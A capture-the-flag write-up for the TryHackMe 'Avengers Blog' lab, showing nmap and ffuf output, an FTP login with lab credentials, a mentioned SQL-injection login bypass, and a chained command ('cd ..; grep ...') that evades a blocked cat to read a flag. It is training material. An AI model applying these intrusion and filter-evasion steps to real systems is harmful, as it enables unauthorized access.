
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Avengers_Blog/images/129-1.png)

The room description encapsulates very well what i did to get all the flags.

I started with a ports scanning.
```text
# Nmap 7.80 scan initiated Tue Nov 17 05:37:42 2020 as: nmap -sS -T4 -oN sca1.txt 10.10.119.164
Nmap scan report for 10.10.119.164
Host is up (0.10s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

# Nmap done at Tue Nov 17 05:37:45 2020 -- 1 IP address (1 host up) scanned in 2.78 seconds
```

```text
# Nmap 7.80 scan initiated Tue Nov 17 05:39:22 2020 as: nmap -sV -sC -p21,22,80 -oN scan2.txt 10.10.119.164
Nmap scan report for 10.10.119.164
Host is up (0.059s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d1:83:40:8f:b2:38:32:19:22:1e:22:3e:86:ff:4f:6c (RSA)
|   256 f9:19:b5:0d:19:a1:54:99:e7:d9:f2:a2:83:72:e7:97 (ECDSA)
|_  256 77:21:d8:d3:82:a9:f2:01:7d:2d:37:72:7b:f5:d6:86 (ED25519)
80/tcp open  http    Node.js Express framework
|_http-title: Avengers! Assemble!
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 17 05:39:34 2020 -- 1 IP address (1 host up) scanned in 12.37 seconds
```

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Avengers_Blog/images/129-2.png)

The first and second flags were one in the cookies and the other in the header of the page. I enumerated service ftp with username groot and the password from the image.

```text
ftp 10.10.119.164
Connected to 10.10.119.164.
220 (vsFTPd 3.0.3)
Name (10.10.119.164:root): groot
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Oct 04  2019 .
dr-xr-xr-x    3 65534    65534        4096 Oct 04  2019 ..
drwxr-xr-x    2 1001     1001         4096 Oct 04  2019 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Oct 04  2019 .
dr-xr-xr-x    3 65534    65534        4096 Oct 04  2019 ..
-rw-r--r--    1 0        0              33 Oct 04  2019 flag3.txt
226 Directory send OK.
```

I was in a dead end, but luckily i found some pages which turned out to be useful.  

```text
./ffuf -u http://10.10.119.164/FUZZ -w /usr/share/wordlists/dirb/common.txt  -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.119.164/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

                        [Status: 200, Size: 7292, Words: 2394, Lines: 192]
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11]
css                     [Status: 301, Size: 173, Words: 7, Lines: 11]
home                    [Status: 302, Size: 23, Words: 4, Lines: 1]
Home                    [Status: 302, Size: 23, Words: 4, Lines: 1]
img                     [Status: 301, Size: 173, Words: 7, Lines: 11]
js                      [Status: 301, Size: 171, Words: 7, Lines: 11]
logout                  [Status: 302, Size: 29, Words: 4, Lines: 1]
portal                  [Status: 200, Size: 1409, Words: 162, Lines: 31]
:: Progress: [4615/4615] :: Job [1/1] :: 288 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
```

I used the most basic sqli payload and bypassed the login form.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Avengers_Blog/images/129-3.png)  
This form executes linux commnads and displays the result above it.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Avengers_Blog/images/129-4.png)

The flag is in the parent directory and the cat command is not allowed, but i managed to read the flag using grep.  
```text
cd ..; grep '' flag5.txt
```

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Avengers_Blog/images/129-5.png)
